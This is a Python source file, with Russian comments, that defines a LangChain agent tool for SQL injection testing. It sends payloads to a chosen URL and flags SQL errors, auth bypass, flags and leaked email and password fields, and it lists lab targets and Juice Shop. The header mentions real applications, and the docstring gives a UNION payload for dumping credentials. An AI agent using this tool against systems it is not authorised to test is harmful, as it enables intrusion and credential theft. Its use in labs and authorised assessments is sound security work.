# проверка SQLi на тестовом стенде и на реальном приложении
import requests
from langchain.tools import tool


@tool
def test_sqli_lab(base_url: str, endpoint: str, payload: str,
    param: str = "q", method: str = "GET"):
    """проверяет эндпоинт на SQL-инъекцию 

    отправляет запрос с payload в параметре, анализирует ответ на предмет
    SQL-ошибок, утечки данных, изменения поведения

    поддерживает:
      - error-based: payload "test'" → SQL-ошибка в ответе
      - UNION-based: payload "') UNION SELECT ... FROM Users--" → утечка email/password

    используй для:
      - тестирования SQLi Lab:  
        - /api/login (POST, params: username, password) — in-band
        - /api/check_user (GET, param: id) — blind boolean
        - /api/check_user_slow (GET, param: username) — blind time
        - /api/oob (GET, param: username) — out-of-band
      - Juice Shop: /rest/products/search (GET, param="q")

    base_url - адрес ресурса 
    endpoint - точка входа 
    payload  - SQL-payload
    param    - имя параметра 
    method   - GET/POST
    """

    # ============== выполняет HTTP-запрос ==============
    url = f"{base_url.rstrip('/')}{endpoint}"
    try:
        if method.upper() == "POST":
            r = requests.post(url, json={param: payload}, timeout=30)
        else:
            r = requests.get(url, params={param: payload}, timeout=30)
    except Exception as e:
        return f"ошибка: {e}"

    full_body = r.text or ""
    body_lower = full_body.lower()
    body_preview = full_body[:3000]

    # ============== признаки SQLi ==============
    indicators = []

    if r.status_code == 200 and '"status":"ok"' in body_lower.replace(" ", ""):
        indicators.append("auth bypass status OK")

    sql_error_markers = [
        "sqlite_error", "syntax error", "sql syntax",
        "mysql_fetch", "postgresql", "ora-0",
        "unclosed quotation", "you have an error in your sql",
        "sequelize", "sqlstate",
    ]
    found_errors = [m for m in sql_error_markers if m in body_lower]
    if found_errors:
        indicators.append(f"SQL-ошибка: {', '.join(found_errors)}")

    if "FLAG{" in full_body:
        indicators.append("утечка секрета (FLAG)")
    if "secret" in body_lower:
        indicators.append("утечка secrets")

    if '"email"' in body_lower and '"password"' in body_lower:
        indicators.append("утечка email/password (union)")
    if r.status_code == 500 and found_errors:
        indicators.append("HTTP 500 + SQL-ошибка")

    # ============== вердикт ==============
    if indicators:
        verdict = "SQLi ПОДТВЕРЖДЁН"
        status = "confirmed"
    elif r.status_code == 200:
        verdict = "ОК (индикаторов SQLi нет)"
        status = "requires_verification"
    else:
        verdict = f"ОК (статус {r.status_code})"
        status = "requires_verification"

    return (
        f"URL: {url}\n"
        f"payload: {payload}\n"
        f"status: {r.status_code}\n"
        f"verdict: {verdict}\n"
        f"finding_status: {status}\n"
        f"indicators: {indicators}\n"
        f"body: {body_preview}"
    )